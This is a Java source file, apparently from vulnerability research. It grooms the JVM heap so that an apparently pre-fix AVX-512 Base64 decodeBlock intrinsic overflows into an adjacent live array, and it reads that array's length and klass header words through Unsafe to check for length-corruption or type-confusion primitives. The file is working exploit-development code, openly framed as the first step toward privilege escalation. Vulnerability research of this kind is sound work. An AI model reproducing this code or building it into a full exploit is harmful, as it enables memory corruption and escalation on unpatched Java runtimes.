/*
 * Groom.java - step 1 of the escalation research: can the 64-byte store corrupt a LIVE
 * object that sits directly behind the destination array, and can we read the result?
 *
 * Layout control: with TLAB bump allocation, allocating dst and then victim back to back
 * makes them adjacent. The reflective decodeBlock call then runs the pre-fix AVX-512 tail
 * path, whose store lands at dst+output_size .. +64 - i.e. inside victim's header.
 *
 * Measurement: read victim's length and klass words through Unsafe before/after the call.
 * A changed length is a length-corruption primitive; a changed klass is type confusion.
 * Nothing is dereferenced afterwards, so a crash here is itself a result.
 *
 * Run: java --add-opens java.base/java.util=ALL-UNNAMED Groom.java [runs]
 */
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Arrays;
import java.util.Base64;

public class Groom {

    private static final int SRC_LEN = 130;
    private static final int DST_LEN = (SRC_LEN / 4) * 3;   // 96
    private static final int VICTIM_LEN = 96;

    public static void main(String[] args) throws Exception {
        int runs = args.length > 0 ? Integer.parseInt(args[0]) : 5;
        System.out.println("jdk=" + System.getProperty("java.version"));

        Class<?> decCls = Class.forName("java.util.Base64$Decoder");
        Base64.Decoder dec = Base64.getDecoder();
        Method decodeBlock = null;
        for (Method m : decCls.getDeclaredMethods()) {
            Class<?>[] p = m.getParameterTypes();
            if (m.getName().equals("decodeBlock") && p.length == 7
                    && p[0] == byte[].class && p[3] == byte[].class) {
                decodeBlock = m;
                break;
            }
        }
        if (decodeBlock == null) {
            System.out.println("decodeBlock not found");
            return;
        }
        decodeBlock.setAccessible(true);

        Field uf = Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
        uf.setAccessible(true);
        sun.misc.Unsafe u = (sun.misc.Unsafe) uf.get(null);
        long base = u.arrayBaseOffset(byte[].class);       // 16 with compressed oops

        byte[] src = new byte[SRC_LEN];
        Arrays.fill(src, (byte) '/');
        src[SRC_LEN - 1] = '=';
        src[SRC_LEN - 2] = '=';

        byte[] scratch = new byte[DST_LEN];
        Integer zero = Integer.valueOf(0);
        Integer slen = Integer.valueOf(SRC_LEN);
        Boolean no = Boolean.FALSE;
        Object[] call = new Object[]{src, zero, slen, scratch, zero, no, no};

        // warm up so the intrinsic is compiled
        for (int i = 0; i < 200_000; i++) {
            try {
                decodeBlock.invoke(dec, call);
            } catch (Throwable ignored) {
            }
        }
        System.out.println("warmup done; base offset=" + base);

        for (int r = 0; r < runs; r++) {
            byte[] dst = new byte[DST_LEN];
            byte[] victim = new byte[VICTIM_LEN];          // allocated right after dst

            int lenBefore = u.getInt(victim, base - 4);
            int klassBefore = u.getInt(victim, base - 8);

            call[3] = dst;
            int ret = -1;
            try {
                ret = (Integer) decodeBlock.invoke(dec, call);
            } catch (Throwable t) {
                System.out.println("  invoke threw " + t.getCause());
            }

            int lenAfter = u.getInt(victim, base - 4);
            int klassAfter = u.getInt(victim, base - 8);

            System.out.printf("run %d: ret=%d len %d->%d %s  klass %08x->%08x %s%n",
                    r, ret, lenBefore, lenAfter,
                    lenBefore == lenAfter ? "(same)" : "** CHANGED **",
                    klassBefore, klassAfter,
                    klassBefore == klassAfter ? "(same)" : "** CHANGED **");
        }
    }
}
